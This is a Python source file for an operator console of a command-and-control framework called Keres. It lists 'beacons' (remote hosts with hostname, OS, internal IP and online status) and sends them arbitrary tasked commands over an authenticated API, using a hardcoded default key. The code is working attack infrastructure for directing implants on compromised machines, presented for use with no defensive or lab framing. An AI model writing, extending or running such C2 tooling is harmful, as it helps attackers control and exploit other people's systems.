import httpx
import asyncio
import os
import sys
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.prompt import Prompt

console = Console()

class KeresOperatorUI:
    def __init__(self, api_url: str, api_key: str):
        self.api_url = api_url
        self.headers = {"Authorization": f"Bearer {api_key}"}
        self.client = httpx.AsyncClient(
            base_url=api_url,
            headers=self.headers,
            timeout=15.0,
            follow_redirects=True
        )
        self.session_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    async def fetch_beacons(self):
        try:
            response = await self.client.get("/api/v1/beacons")
            return response.json() if response.status_code == 200 else []
        except Exception:
            return []

    def generate_table(self, beacons):
        table = Table(show_header=True, header_style="bold red", border_style="dim white")
        table.add_column("ID", width=12)
        table.add_column("Hostname", width=20)
        table.add_column("OS / Arch", width=25)
        table.add_column("Internal IP", width=15)
        table.add_column("Last Seen", width=20)
        table.add_column("Status", justify="center")

        for b in beacons:
            last_seen = b.get('last_seen', 'N/A')
            status = "[bold green]ONLINE[/bold green]" if b.get('active') else "[dim red]OFFLINE[/dim red]"

            table.add_row(
                b.get('id', '???'),
                b.get('hostname', 'Unknown'),
                f"{b.get('os', 'N/A')} ({b.get('arch', 'x64')})",
                b.get('ip', '0.0.0.0'),
                last_seen,
                status
            )
        return table

    def render_header(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        logo ="""
        [bold red]
        ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗███████╗
        ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
        ██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║███████╗
        ██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
        ╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║╚██████╔╝███████║
         ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝[/bold red]
        """
        meta = f"[dim white]Session Started: {self.session_start} | API: {self.api_url}[/dim white]"
        console.print(Panel(logo, subtitle=meta, border_style="red", padding=(1, 2)))

    async def send_task(self, beacon_id: str, command: str, args: list):
        payload = {
            "command": command,
            "args": args,
            "issued_at": datetime.now().isoformat()
        }
        try:
            res = await self.client.post(f"/api/v1/beacons/{beacon_id}/task", json=payload)
            if res.status_code in [200, 202]:
                console.print(f"[bold green]TASKED:[/bold green] {command} -> {beacon_id}")
            else:
                console.print(f"[bold red]FAILED:[/bold red] HTTP {res.status_code}")
        except Exception as e:
            console.print(f"[bold red]ERROR:[/bold red] {str(e)}")

    async def cmd_loop(self):
        self.render_header()

        while True:
            beacons = await self.fetch_beacons()
            console.print(self.generate_table(beacons))

            try:
                raw_input = Prompt.ask("\n[bold red]keres[/bold red]").strip()
                if not raw_input: continue

                parts = raw_input.split()
                cmd = parts[0].lower()

                if cmd in ["exit", "quit"]:
                    await self.client.aclose()
                    sys.exit(0)

                elif cmd == "clear":
                    self.render_header()

                elif cmd == "help":
                    console.print("[yellow]Commands:[/yellow] task <id> <cmd> <args> | clear | refresh | exit")

                elif cmd == "task" and len(parts) >= 3:
                    target_id = parts[1]
                    action = parts[2]
                    params = parts[3:] if len(parts) > 3 else []
                    await self.send_task(target_id, action, params)

                elif cmd == "refresh":
                    continue

                else:
                    console.print("[dim white]Unknown command. Type 'help' for options.[/dim white]")

            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    ui = KeresOperatorUI(
        api_url=os.getenv("KERES_API", "http://127.0.0.1:5000"),
        api_key=os.getenv("KERES_KEY", "keres_admin_2026")
    )
    try:
        asyncio.run(ui.cmd_loop())
    except Exception:
        pass